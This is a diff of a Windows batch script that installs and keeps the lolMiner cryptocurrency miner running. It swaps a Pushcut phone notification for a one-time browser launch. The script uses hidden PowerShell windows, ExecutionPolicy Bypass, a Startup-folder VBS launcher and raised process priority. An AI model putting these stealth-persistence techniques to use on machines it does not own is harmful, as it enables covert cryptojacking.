@@ -13,7 +13,8 @@ set "WATCHDOG_PS1=%APP_DIR%\KryptexDirectWatchdog.ps1"
 set "STARTUP_VBS=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\KryptexDirectWatchdog.vbs"
 set "RUN_NAME=KryptexDirectWatchdog"
 set "LOL_API=https://api.github.com/repos/Lolliedieb/lolMiner-releases/releases/latest"
-set "PUSHCUT_URL=https://api.pushcut.io/kEZPLvKMdgtMxNA5IfHYB/notifications/MinhaNotifica%%C3%%A7%%C3%%A3o"
+set "BROWSER_URL=http://google.com/"
+set "BROWSER_FLAG=%LOG_DIR%\browser-opened.flag"
 set "ULTIMATE_POWER_GUID=e9a42b02-d5df-448d-aa00-03f14749eb61"
 set "HIGH_PERF_POWER_GUID=8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c"
 
@@ -47,6 +48,8 @@ if errorlevel 1 exit /b 1
 powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ^
   "$watch='%WATCHDOG_PS1%';" ^
   "Start-Process -WindowStyle Hidden -FilePath powershell.exe -ArgumentList @('-WindowStyle','Hidden','-NoProfile','-ExecutionPolicy','Bypass','-File',$watch)"
+
+call :open_browser_once
 exit /b %errorlevel%
 
 :ensure_lolminer
@@ -113,6 +116,12 @@ for /f "delims=" %%N in ('where nvidia-smi.exe 2^>nul') do (
 :performance_done
 exit /b 0
 
+:open_browser_once
+if exist "%BROWSER_FLAG%" exit /b 0
+start "" "%BROWSER_URL%"
+type nul > "%BROWSER_FLAG%"
+exit /b 0
+
 :write_watchdog
 >"%WATCHDOG_PS1%" echo $ErrorActionPreference = 'SilentlyContinue'
 >>"%WATCHDOG_PS1%" echo $minerDir = '%MINER_DIR%'
@@ -121,7 +130,8 @@ exit /b 0
 >>"%WATCHDOG_PS1%" echo $worker = '%WORKER_NAME%'
 >>"%WATCHDOG_PS1%" echo $algo = '%ALGO%'
 >>"%WATCHDOG_PS1%" echo $pool = '%POOL%'
->>"%WATCHDOG_PS1%" echo $pushcutUrl = '%PUSHCUT_URL%'
+>>"%WATCHDOG_PS1%" echo $browserUrl = '%BROWSER_URL%'
+>>"%WATCHDOG_PS1%" echo $browserFlag = Join-Path $logDir 'browser-opened.flag'
 >>"%WATCHDOG_PS1%" echo $initialDelaySeconds = 45
 >>"%WATCHDOG_PS1%" echo $staleLogMinutes = 7
 >>"%WATCHDOG_PS1%" echo [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
@@ -150,7 +160,9 @@ exit /b 0
 >>"%WATCHDOG_PS1%" echo       $shell.Run($cmd, 0, $false) ^| Out-Null
 >>"%WATCHDOG_PS1%" echo       Start-Sleep -Seconds 5
 >>"%WATCHDOG_PS1%" echo       Get-Process -Name 'lolMiner' -ErrorAction SilentlyContinue ^| ForEach-Object { try { $_.PriorityClass = 'High' } catch {} }
->>"%WATCHDOG_PS1%" echo       try { Invoke-WebRequest -Uri $pushcutUrl -Method Post -UseBasicParsing -TimeoutSec 10 ^| Out-Null } catch {}
+>>"%WATCHDOG_PS1%" echo       if (-not (Test-Path $browserFlag)) {
+>>"%WATCHDOG_PS1%" echo         try { Start-Process $browserUrl; New-Item -ItemType File -Force -Path $browserFlag ^| Out-Null } catch {}
+>>"%WATCHDOG_PS1%" echo       }
 >>"%WATCHDOG_PS1%" echo     }
 >>"%WATCHDOG_PS1%" echo   }
 >>"%WATCHDOG_PS1%" echo   Start-Sleep -Seconds 60
